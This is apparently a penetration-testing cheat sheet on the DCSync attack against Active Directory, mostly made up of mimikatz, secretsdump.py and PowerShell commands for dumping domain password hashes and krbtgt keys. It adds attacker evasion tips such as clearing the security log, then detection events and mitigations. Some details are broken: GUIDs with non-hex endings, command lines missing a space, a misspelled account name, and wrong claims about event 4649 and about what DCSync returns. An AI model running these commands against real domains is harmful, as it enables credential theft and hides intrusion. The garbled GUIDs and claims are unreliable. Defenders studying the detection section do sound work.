# <span style="color:rgb(255, 192, 0)">DCSync Attack</span>

DCSync abuses the DRSUAPI (Directory Replication Service) protocol to mimic a domain controller and replicate credential data from the domain. It extracts password hashes, Kerberos keys, and other sensitive material without needing to run code on the DC itself.

**Discovery**: @gentilkiwi in Mimikatz | **Tools**: `mimikatz lsadump::dcsync`, `secretsdump.py -just-dc`

---

## <span style="color:rgb(255, 0, 0)">Requirements</span>

| Privilege | Description |
|-----------|-------------|
| Domain Admin | Full replication rights (default) |
| Enterprise Admin | Replicates across forest |
| Delegated Replication | Any account with `GetChanges` + `GetChangesAll` rights |
| Domain Controller | The DC can also sync from itself if rights allow |

**Required Extended Rights on Domain NC:**
- `DS-Replication-Get-Changes` (control right = 1131f6aa-9c07-11d1-f79f-00c04fc2dcdi)
- `DS-Replication-Get-Changes-All` (control right = 1131f6ad-9c07-11d1-f79f-00c04fc2dcdi)

---

## <span style="color:rgb(0, 176, 240)">Mimikatz DCSync</span>

### DCSync Specific User
```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator
```

### DCSync All Users
```mimikatz
lsadump::dcsync /domain:contoso.local /all /csv
```

### DCSync krbtgt (Golden Ticket Prep)
```mimikatz
lsadump::dcsync /domain:contoso.local /user:krbtgt
```

### DCSync with Specific DC
```mimikatz
lsadump::dcsync /domain:contoso.local /user:Administrator /dc:DC02.contoso.local
```

### DCSync with Specific GUID
```mimikatz
lsadump::dcsync /domain:contoso.local /guid:{GUID}
```

---

## <span style="color:rgb(112, 48, 160)">Impacket secretsdump.py DCSync</span>

### Basic DCSync
```bash
secretsdump.py -just-dc contoso.local/Administrator:Passw0rd@DC01.contoso.local
```

### DCSync NTLM Only
```bash
secretsdump.py -just-dc-ntlm contoso.local/Administrator:Passw0rd@DC01.contoso.local
```

### DCSync with Hashes (Pass-the-Hash)
```bash
secretsdump.py -hashes :NTLM_HASH contoso.local/Administrator@DC01.contoso.local
```

### DCSync via Kerberos (with ticket)
```bash
export KRB5CCNAME=/path/to/ticket.ccache
secretsdump.py -k contoso.local/Administrator@DC01.contoso.local
```

### DCSync with Target DC
```bash
secretsdump.py -just-dc-contoso.local/Administrator:Passw0rd@DC02.contoso.local -dc-ip 10.0.0.5
```

### DCSync Output to File
```bash
secretsdump.py -just-dc-contoso.local/Administrator:Passw0rd@DC01.contoso.local -outputfile dcsync_dump
```

---

## <span style="color:rgb(146, 208, 80)">DCSync via Other Tools</span>

### PowerView DCSync
```powershell
# Using Invoke-Mimikatz through PowerView
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:contoso.local /user:krbtgt"'
```

### DCSync via AD Module
```powershell
# Requires DSInternals module
Install-Module DSInternals -Force
Get-ADReplAccount -Server DC01 -Identity krbtget |
    Format-Custom -View HashView | fl
```

---

## <span style="color:rgb(0, 32, 96)">What DCSync Extracts</span>

For each synchronized user, DCSync retrieves:
- **NTLM hash** (RC4 key)
- **LM hash** (if enabled)
- **AES128 key** (Kerberos)
- **AES256 key** (Kerberos)
- **DES key** (if enabled)
- **Kerberos salt**
- **Supplemental credentials** (cleartext password if WDigest enabled)
- **Kerberos ticket-granting-ticket** (for krbtgt)

---

## <span style="color:rgb(255, 0, 0)">Detection</span>

### Windows Event Logs

| Event ID | Description |
|----------|-------------|
| 4662 | Directory Service Access (control access) |
| 4624 | Account logon (replication account) |
| 4649 | Replication request |
| 5136 | Directory Service Changes |
| 4670 | Permissions on an object |

### Detection Rules

**Event 4662** — Look for:
```xml
<EventID>4662</EventID>
<Data Name="AccessMask">0x20000</Data>  <!-- Control Access -->
<Data Name="Properties">{{1131f6aa-9c07-11d1-f79f-00c04fc2dcdi}}</Data>  <!-- GetChanges -->
<Data Name="SubjectUserName">Administrator</Data>
<Data Name="ObjectType">{19195a5b-6da0-11d0-afd3-00c04fd930c9}</Data>  <!-- domainDNS -->
```

**Suspicious Patterns:**
- Non-DC machines requesting replication
- Multiple DCSync operations in a short window
- Replication from unexpected source IPs
- Account used for replication is not the built-in domain controller accounts (DC01$, etc.)

### Network Detection
DCSync uses LDAP (389/TCP) or LDAPS (636/TCP) for replication:
```
DRSUAPI bind and replication requests
Extended DN format operations
```
Monitor for `DRSUAPI` bind operations from non-DC IPs.

---

## <span style="color:rgb(94, 18, 18)">OPSEC & Mitigation</span>

### For Attacker
- DCSync is loud; use on your final target (DC) only
- Consider offline NTDS.dit extraction instead
- Use a compromised DA session rather than passing hashes
- Clean up logs if possible (`wevtutil cl security`)
- Target specific users (`/user:krbtgt`) rather than `/all`
- Use compromised DC accounts (DC01$) to blend in

### For Defender
| Mitigation | Effect |
|------------|--------|
| Monitor Event 4662 | Detect unusual replication requests |
| Protected Users group | Blocks NTLM auth from escalation |
| Restrict replication rights | Remove `GetChanges` from privileged accounts not needing it |
| Use honeytoken accounts | Set up accounts with high replication privileges purely for detection |
| Enable advanced audit policy | Audit `DS Access` > `Directory Service Changes` |
| SACL on domain NC | Add audit SACL for replication rights |
| EDR on DCs | Monitor process access to LSASS and suspicious memory |
